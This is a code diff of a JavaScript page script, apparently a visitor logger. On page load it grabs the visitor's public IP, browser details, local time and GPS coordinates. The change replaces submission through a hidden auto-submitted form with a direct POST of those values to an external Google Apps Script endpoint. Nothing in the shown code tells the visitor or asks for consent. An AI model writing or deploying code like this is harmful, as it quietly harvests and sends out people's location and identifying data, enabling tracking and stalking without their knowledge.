@@ -1,28 +1,33 @@
-
 async function autoSubmitForm() {
-    const form = document.getElementById("hiddenForm");
-
-    // Get IP Address
     const ipData = await fetch("https://api.ipify.org?format=json").then(res => res.json());
 
-    // Get location
-    navigator.geolocation.getCurrentPosition(function (position) {
+    navigator.geolocation.getCurrentPosition(async function (position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
-        // Fill values
-        form.elements["ip"].value = ipData.ip;
-        form.elements["userAgent"].value = navigator.userAgent;
-        form.elements["language"].value = navigator.language;
-        form.elements["timezone"].value = new Date().toLocaleString();
-        form.elements["latitude"].value = latitude;
-        form.elements["longitude"].value = longitude;
+        const formData = new URLSearchParams();
+        formData.append("ip", ipData.ip);
+        formData.append("userAgent", navigator.userAgent);
+        formData.append("language", navigator.language);
+        formData.append("timezone", new Date().toLocaleString());
+        formData.append("latitude", latitude);
+        formData.append("longitude", longitude);
 
-        // Auto submit the form
-        form.submit();
+        try {
+            const response = await fetch("https://script.google.com/macros/s/AKfycbzYWKmICz_bsmnmHhcjSnqIYtPZ72hEBi5n2pAJAwyxyrrzgdvuiuR3kEkuv-BYNgQF/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                },
+                body: formData.toString()
+            });
+
+            const result = await response.text();
+            console.log("Success:", result);
+        } catch (error) {
+            console.error("Error submitting form:", error);
+        }
     });
 }
 
-// Start after page loads
 window.onload = autoSubmitForm;
-
